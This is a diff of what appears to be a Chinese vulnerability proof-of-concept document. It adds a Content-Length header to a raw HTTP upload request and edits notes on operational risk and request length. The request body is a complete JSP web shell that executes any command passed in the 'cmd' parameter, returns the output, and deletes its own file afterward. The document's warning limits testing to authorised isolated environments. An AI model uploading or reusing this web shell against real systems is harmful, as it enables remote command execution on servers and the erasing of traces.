@@ -39,7 +39,7 @@ schema_version: "1"
 
 ## 操作风险
 
-文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -83,11 +83,12 @@ Accept: */*
 Connection: close
 Host: 127.0.0.1
 Content-Type: application/octet-stream
+Content-Length: 313
 
 <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
 ```  
 
-> 请求长度说明：原资料 Content-Length 为 313；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 313；保留原始标头；其数值未据实际请求体重新计算或验证。
   
 ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bpxjhEiajmeumKOs4Qd7oSU778Ex6sRaUWPkhzdxsibPMnwcEX5E2tYDzich8HZG4sIjuW5GHT0APXQ/640?wx_fmt=jpeg&from=appmsg "null")  
   
